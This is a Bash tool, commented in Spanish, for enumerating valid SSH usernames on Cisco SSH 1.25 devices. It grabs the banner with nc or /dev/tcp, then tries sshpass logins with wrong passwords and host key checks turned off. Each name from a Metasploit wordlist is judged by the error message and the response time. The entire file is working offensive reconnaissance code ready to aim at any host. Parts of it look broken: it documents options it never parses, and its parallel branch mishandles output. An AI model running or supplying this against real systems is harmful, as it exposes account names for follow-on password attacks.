#!/bin/bash

#:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
# cisco-ssh-enum.sh
#
# Enumeración de usuarios SSH en Cisco SSH 1.25
# Técnicas: timing analysis, error analysis, respuesta diferencial
#
# Autor: @antonio_taboada — hackingyseguridad.com
# Licencia: GPL-3.0
#:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

set -u

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'  # No Color

# Variables globales
TARGET_HOST="${1:-}"
TARGET_PORT="${2:-22}"
WORDLIST="${3:-/usr/share/wordlists/metasploit/unix_users.txt}"
TIMEOUT="${TIMEOUT:-5}"
THREADS="${THREADS:-4}"

# Ficheros temporales
TEMP_RESULTS="/tmp/cisco_ssh_enum_$$_results.txt"
TEMP_TIMINGS="/tmp/cisco_ssh_enum_$$_timings.txt"

# Umbrales
TIMING_THRESHOLD_MS=300  # Usuarios válidos suelen tardar más

#:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
# Funciones
#:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

usage() {
    cat << EOF
${BLUE}Cisco SSH 1.25 Username Enumeration${NC}

Sintaxis: $0 <target> [puerto] [wordlist] [opciones]

Ejemplos:
  $0 192.168.1.1 22 /tmp/users.txt
  $0 router.local /usr/share/wordlists/metasploit/unix_users.txt
  $0 10.0.0.5 2222 usuarios.txt -t 8 -T 3000

Opciones:
  -t N      Número de threads paralelos (default: 4)
  -T MS     Umbral timing en ms (default: 300)
  -v        Verbose (mostrar todos los intentos)

EOF
    exit 1
}

log_info() {
    echo -e "${BLUE}[*]${NC} $*"
}

log_success() {
    echo -e "${GREEN}[+]${NC} $*"
}

log_error() {
    echo -e "${RED}[-]${NC} $*"
}

log_warning() {
    echo -e "${YELLOW}[!]${NC} $*"
}

# Banner grabbing y detección de versión
detect_cisco_ssh() {
    local host="$1"
    local port="$2"
    
    log_info "Detectando versión SSH..."
    
    local banner
    banner=$(timeout 3 nc -q 1 "$host" "$port" 2>/dev/null || \
             timeout 3 bash -c "cat < /dev/null > /dev/tcp/$host/$port; exec 3<>/dev/tcp/$host/$port; cat <&3" 2>/dev/null)
    
    if [ -z "$banner" ]; then
        log_error "No se puede conectar a $host:$port"
        return 1
    fi
    
    echo "$banner" | head -n 1
    
    # Verificar si es Cisco SSH
    if echo "$banner" | grep -qi "cisco"; then
        log_success "Detectado: Cisco SSH"
        return 0
    elif echo "$banner" | grep -qi "openssh"; then
        log_warning "Detectado: OpenSSH (no es Cisco SSH)"
        return 1
    else
        log_warning "SSH desconocido: $banner"
        return 1
    fi
}

# Medir tiempo de respuesta SSH (timing analysis)
measure_ssh_timing() {
    local host="$1"
    local port="$2"
    local username="$3"
    
    local start_ms
    local end_ms
    local elapsed_ms
    
    start_ms=$(date +%s%N | cut -b1-13)
    
    # Intentar conexión SSH con timeout
    # Cisco SSH 1.25 suele usar password auth
    timeout "$TIMEOUT" sshpass -p "wrongpass_$RANDOM" \
        ssh -o ConnectTimeout=2 \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            -o PasswordAuthentication=yes \
            -o PubkeyAuthentication=no \
            "$username@$host" -p "$port" \
            "exit" 2>/dev/null >/dev/null || true
    
    end_ms=$(date +%s%N | cut -b1-13)
    elapsed_ms=$((end_ms - start_ms))
    
    echo "$elapsed_ms"
}

# Test rápido con expect (si sshpass no está disponible)
test_ssh_with_expect() {
    local host="$1"
    local port="$2"
    local username="$3"
    local timeout_val="$4"
    
    if ! command -v expect &> /dev/null; then
        return 2
    fi
    
    expect <<EOF 2>/dev/null
        set timeout $timeout_val
        spawn ssh -o StrictHostKeyChecking=no \
                  -o UserKnownHostsFile=/dev/null \
                  -p $port "$username@$host"
        
        expect {
            "password:" {
                send "wrongpass\r"
                expect {
                    "Permission denied" { exit 1 }
                    "Connection closed" { exit 1 }
                    timeout { exit 2 }
                }
            }
            "Permission denied" { exit 1 }
            "Could not resolve" { exit 2 }
            timeout { exit 2 }
        }
EOF
    return $?
}

# Análisis de error SSH (error differential analysis)
analyze_ssh_error() {
    local host="$1"
    local port="$2"
    local username="$3"
    
    # Capturar salida de error
    local error_output
    error_output=$(timeout 3 sshpass -p "testpass123" \
        ssh -o ConnectTimeout=2 \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            "$username@$host" -p "$port" \
            "exit" 2>&1 || true)
    
    # Buscar indicadores de usuario válido vs inválido
    if echo "$error_output" | grep -qi "invalid user\|unknown user"; then
        # Usuario NO existe
        return 1
    elif echo "$error_output" | grep -qi "permission denied\|auth.*fail\|password.*fail"; then
        # Usuario EXISTE pero contraseña inválida
        return 0
    elif echo "$error_output" | grep -qi "connection refused"; then
        # Puerto cerrado o SSH no disponible
        return 2
    fi
    
    # Ambiguo — podría ser válido o no
    return 2
}

# Test de usuario con múltiples técnicas
test_username() {
    local host="$1"
    local port="$2"
    local username="$3"
    
    # Técnica 1: Análisis de error
    analyze_ssh_error "$host" "$port" "$username"
    error_result=$?
    
    if [ $error_result -eq 0 ]; then
        echo "FOUND"
        return 0
    elif [ $error_result -eq 1 ]; then
        echo "NOT_FOUND"
        return 1
    fi
    
    # Técnica 2: Timing analysis (si Técnica 1 no fue concluyente)
    local timing_ms
    timing_ms=$(measure_ssh_timing "$host" "$port" "$username")
    
    if [ "$timing_ms" -ge "$TIMING_THRESHOLD_MS" ]; then
        echo "FOUND"
        return 0
    else
        echo "NOT_FOUND"
        return 1
    fi
}

# Procesar usuario (thread worker)
process_user() {
    local host="$1"
    local port="$2"
    local username="$3"
    local temp_file="$4"
    
    local result
    result=$(test_username "$host" "$port" "$username")
    
    if [ "$result" = "FOUND" ]; then
        echo "$username:FOUND" >> "$temp_file"
    else
        echo "$username:NOT_FOUND" >> "$temp_file"
    fi
}

export -f test_username measure_ssh_timing analyze_ssh_error
export -f log_info log_success log_error log_warning

# Función de enumeración con paralelismo
enumerate_users() {
    local host="$1"
    local port="$2"
    local wordlist="$3"
    local threads="$4"
    
    if [ ! -f "$wordlist" ]; then
        log_error "Wordlist no encontrado: $wordlist"
        return 1
    fi
    
    local total_users
    total_users=$(wc -l < "$wordlist")
    
    log_info "Enumerando $total_users usuarios con $threads threads"
    echo ""
    
    # Limpiar fichero temporal de resultados
    > "$TEMP_RESULTS"
    
    # Procesar usuarios en paralelo
    local count=0
    while IFS= read -r username; do
        [ -z "$username" ] && continue
        
        count=$((count + 1))
        
        # Mostrar progreso
        printf "\r[%d/%d] Probando %-20s" "$count" "$total_users" "$username"
        
        # Usar GNU parallel si está disponible, sino usar xargs
        if command -v parallel &> /dev/null; then
            echo "$username" | parallel \
                test_username "$host" "$port" {} ">" "$TEMP_RESULTS"
        else
            # Fallback: procesamiento secuencial en bloques
            (
                result=$(test_username "$host" "$port" "$username" 2>/dev/null)
                if [ "$result" = "FOUND" ]; then
                    echo "$username:FOUND" >> "$TEMP_RESULTS"
                fi
            ) &
            
            # Limitar paralelismo manual
            if [ $((count % threads)) -eq 0 ]; then
                wait
            fi
        fi
    done < "$wordlist"
    
    wait
    echo ""
}

# Mostrar resultados
show_results() {
    echo ""
    log_info "Resultados de enumeración:"
    echo "────────────────────────────────────────"
    
    if [ ! -f "$TEMP_RESULTS" ]; then
        log_error "No hay resultados"
        return 1
    fi
    
    local found_count=0
    local not_found_count=0
    
    while IFS=: read -r username result; do
        [ -z "$username" ] && continue
        
        if [ "$result" = "FOUND" ]; then
            log_success "$username"
            found_count=$((found_count + 1))
        else
            not_found_count=$((not_found_count + 1))
        fi
    done < "$TEMP_RESULTS"
    
    echo "────────────────────────────────────────"
    echo ""
    
    if [ $found_count -gt 0 ]; then
        log_success "Total usuarios encontrados: $found_count"
        return 0
    else
        log_error "No se encontraron usuarios válidos"
        return 1
    fi
}

#:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
# Main
#:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

main() {
    if [ -z "$TARGET_HOST" ]; then
        usage
    fi
    
    echo ""
    echo -e "${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║ Cisco SSH 1.25 Username Enumeration    ║${NC}"
    echo -e "${BLUE}║ @antonio_taboada hackingyseguridad.com ║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    echo ""
    
    log_info "Objetivo: $TARGET_HOST:$TARGET_PORT"
    log_info "Wordlist: $WORDLIST"
    log_info "Timeout: ${TIMEOUT}s"
    log_info "Threads: $THREADS"
    echo ""
    
    # Detectar Cisco SSH
    if ! detect_cisco_ssh "$TARGET_HOST" "$TARGET_PORT"; then
        log_warning "El objetivo podría no ser Cisco SSH, pero continuamos..."
    fi
    echo ""
    
    # Enumerar usuarios
    enumerate_users "$TARGET_HOST" "$TARGET_PORT" "$WORDLIST" "$THREADS"
    
    # Mostrar resultados
    show_results
    
    # Limpiar ficheros temporales
    rm -f "$TEMP_RESULTS" "$TEMP_TIMINGS"
    
    echo ""
    log_info "Enumeración completada"
}

# Trap para limpiar en caso de interrupción
trap 'echo ""; log_error "Interrumpido por usuario"; rm -f "$TEMP_RESULTS" "$TEMP_TIMINGS"; exit 130' INT TERM

# Ejecutar main
main "$@"
